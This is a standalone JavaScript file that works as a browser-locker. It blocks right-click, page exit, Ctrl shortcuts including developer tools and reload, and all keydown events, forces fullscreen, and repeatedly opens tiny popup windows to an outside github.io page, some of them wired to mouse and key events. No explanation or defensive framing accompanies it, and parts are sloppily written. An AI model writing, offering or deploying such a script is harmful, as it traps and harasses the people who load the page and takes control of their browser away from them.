document.addEventListener('contextmenu', event => event.preventDefault());
window.onbeforeunload = function(e) {
    e.preventDefault();
    e.returnValue = '';
};
document.onkeydown = function(e) {
    e = e || window.event;
    if (!e.ctrlKey) return;
    var code = e.which || e.keyCode;
    switch (code) {
        case 16:
        case 17:
        case 19:
        case 27:
        case 37:
        case 39:
        case 68:
        case 70:
        case 72:
        case 73:
        case 74:
        case 78:
        case 80:
        case 82:
        case 83:
        case 84:
        case 85:
        case 87:
        case 112:
        case 122:
        case 123:
            e.preventDefault();
            e.stopPropagation();
            break;
    }
};
addEventListener("click", function() {
    var
        el = document.documentElement,
        rfs =
        el.requestFullScreen ||
        el.webkitRequestFullScreen ||
        el.mozRequestFullScreen;
    rfs.call(el);
});

function launchFullScreen(element) {
    if (element.requestFullScreen) {
        element.requestFullScreen();
    } else if (element.mozRequestFullScreen) {
        element.mozRequestFullScreen();
    } else if (element.webkitRequestFullScreen) {
        element.webkitRequestFullScreen();
    }
}
launchFullScreen(document.documentElement);

window.onkeydown = function(x) {
    if (x.keyCode === 27) {
        x.preventDefault();
    }
};

window.onkeydown = function(r) {
    if (r.keyCode === 82) {
        r.preventDefault();
    }
};

document.onkeydown = function(e) {
    e.preventDefault();
}

window.open('https://th3rdctrl.github.io/index.html', '', 'fullscreen=yes');
window.open('https://th3rdctrl.github.io/index.html', '_parent', 'height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no');
window.open('https://th3rdctrl.github.io/index.html', '_blank', 'height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no');
window.open('https://th3rdctrl.github.io/index.html', '_top', 'height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no');
window.open('https://th3rdctrl.github.io/index.html', '_self', 'height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no');
document.onmousedown = window.open('https://th3rdctrl.github.io/index.html', '_blank', 'height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no');;
document.onkeyup = window.open('https://th3rdctrl.github.io/index.html', '_top', 'height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no');
document.onmousemove = window.open('https://th3rdctrl.github.io/index.html', '_parent', 'height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no');
